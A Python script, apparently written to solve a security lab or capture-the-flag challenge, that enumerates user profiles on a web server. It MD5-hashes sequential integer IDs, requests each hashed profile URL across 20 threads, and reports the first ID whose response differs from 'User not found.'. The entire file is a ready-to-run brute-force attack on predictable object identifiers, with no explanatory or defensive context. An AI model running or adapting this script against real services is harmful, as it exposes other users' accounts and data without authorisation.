import hashlib
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests.adapters import HTTPAdapter

# Thread-local storage ensures each worker thread reuses its own TCP connection safely
thread_local = threading.local()
stop_event = threading.Event()


def get_session(pool_maxsize: int = 20) -> requests.Session:
    if not hasattr(thread_local, "session"):
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=pool_maxsize, pool_maxsize=pool_maxsize)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        thread_local.session = session
    return thread_local.session


def check_id(
    user_id: int,
    base_url: str,
    encoding: str,
    expected_output: str,
    timeout: int = 10,
) -> tuple[int, str, bool]:
    # Exit immediately if another thread already found a match
    if stop_event.is_set():
        return user_id, "", True

    hash_hex = hashlib.md5(str(user_id).encode(encoding)).hexdigest()
    full_url = f"{base_url}{hash_hex}"
    session = get_session()

    try:
        response = session.get(full_url, timeout=timeout)
        actual_output = response.text.strip()
        expected_clean = expected_output.strip()

        if actual_output != expected_clean:
            stop_event.set()  # Signal other threads to halt
            print(
                f"\n[FOUND] Content mismatch for: {full_url} (Status: {response.status_code})"
            )
            print(f"  [+] Matched on integer ID: {user_id} (Hash: {hash_hex})")
            print(f"  Expected: {expected_clean[:100]}")
            print(f"  Received: {actual_output[:300]}")
            return user_id, hash_hex, False

        return user_id, hash_hex, True

    except requests.exceptions.RequestException as error:
        if not stop_event.is_set():
            print(f"\n[ERROR] Request failed for ID {user_id} ({full_url}): {error}")
        return user_id, hash_hex, True


def get_user_inputs():
    default_url = "http://chatelaine.cylabacademy.net:19297/profile/user/"
    default_start = 0
    default_end = 3000
    default_encoding = "utf-8"
    default_expected = "User not found."
    default_workers = 20

    print("--- Configuration (Press Enter to keep default values) ---")
    base_url = input(f"Base URL [{default_url}]: ").strip() or default_url
    if not base_url.endswith("/"):
        base_url += "/"

    start_input = input(f"Start ID [{default_start}]: ").strip()
    start_id = int(start_input) if start_input else default_start

    end_input = input(f"End ID (inclusive) [{default_end}]: ").strip()
    end_id = int(end_input) if end_input else default_end

    encoding = (
        input(f"Encoding type [{default_encoding}]: ").strip() or default_encoding
    )
    expected_text = (
        input(f"Expected 'not found' output [{default_expected}]: ").strip()
        or default_expected
    )

    workers_input = input(f"Max concurrent threads [{default_workers}]: ").strip()
    max_workers = int(workers_input) if workers_input else default_workers

    return base_url, start_id, end_id, encoding, expected_text, max_workers


if __name__ == "__main__":
    try:
        base_url, start_id, end_id, encoding, expected_text, max_workers = (
            get_user_inputs()
        )
    except ValueError:
        print("[-] Invalid numeric input provided for range or worker count.")
        sys.exit(1)

    total_ids = (end_id - start_id) + 1
    completed = 0

    print(
        f"\n[*] Scanning {total_ids} IDs ({start_id} to {end_id}) with {max_workers} threads..."
    )

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all ID checks to the thread pool
        futures = {
            executor.submit(check_id, i, base_url, encoding, expected_text): i
            for i in range(start_id, end_id + 1)
        }

        try:
            for future in as_completed(futures):
                completed += 1
                user_id, hash_hex, is_normal = future.result()

                if not is_normal:
                    # Cancel queued tasks that haven't started yet
                    executor.shutdown(wait=False, cancel_futures=True)
                    sys.exit(0)

                print(
                    f"\r[*] Progress: {completed}/{total_ids} (Last checked ID: {user_id})...",
                    end="",
                    flush=True,
                )
        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user. Shutting down threads...")
            stop_event.set()
            executor.shutdown(wait=False, cancel_futures=True)
            sys.exit(1)

    print(
        f"\n[-] Finished scanning {start_id} to {end_id}. No anomalous profile found."
    )
